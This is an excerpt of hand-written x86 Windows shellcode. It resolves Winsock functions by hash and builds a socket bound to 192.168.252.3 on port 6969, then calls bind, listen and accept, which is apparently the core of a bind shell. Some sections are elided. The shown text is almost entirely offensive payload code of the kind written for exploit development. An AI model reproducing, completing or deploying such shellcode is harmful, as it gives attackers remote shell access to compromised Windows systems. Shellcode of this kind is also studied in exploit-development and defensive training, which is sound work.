    ...
    resolve_symbols_ws2_32:
        ...
        mov [ebp+0x24], eax             ; Save WSAConnect hash
                ...
                call dword ptr[ebp+0x04]                ; Call find function
        mov [ebp+0x28], eax                             ; Save bind
        push 0xe92eada4                 ; listen hash
        call dword ptr[ebp+0x04]        ; Call find function
        mov [ebp+0x2c], eax             ; Save listen
        push 0x498649e5                 ; accept hash
        call dword ptr[ebp+0x04]        ; Call find function
        mov [ebp+0x30], eax             ; Save accept
    ...
    call_wsasocketa:
        ...
        call_bind:
        mov esi, eax                                    ; Save WSASocketA handler to ESI
        xor eax, eax                                    ; NULL EAX
        ; struct sockaddr_in
        push eax                                                ; sin_zero == NULL
        push eax                                                ; sin_zero == NULL
        push 0x03fca8c0                 ; in_addr == 192.168.252.3
        mov ax, 0x391b                  ; sin_port == 6969
        shl eax, 0x10                   ; Left shift EAX by 0x10 bytes; USHORT, 2 bytes long
        add ax, 0x02                    ; Add 0x02 (AF_INET) to AX
        push eax                                                ; Push in_addr, sin_port and af_inet
        push esp                                            ; Save pointer for later use
        pop edi                         ; Save Pointer in EDI
        ; bind
        xor eax, eax                    ; NULL EAX
        add ax, 0x10                                    ; namelen == 0x10
        push eax                        ; Push namelen
        push edi                                                ; sockaddr *addr
        push esi                                                ; WSASocket handler
        call dword ptr[ebp+0x28]                ; Call bind

        ; listen(SOCKET s, int backlog)
        call_listen:
        push 0x1                        ; backlog == 1
        push esi                        ; WSASocket handler
        call dword ptr[ebp+0x2c]        ; Call listen
        ...
        push eax                        ; *addr == NULL
        push esi                        ; WSASocket handler
        call dword ptr[ebp+0x30]        ; Call accept
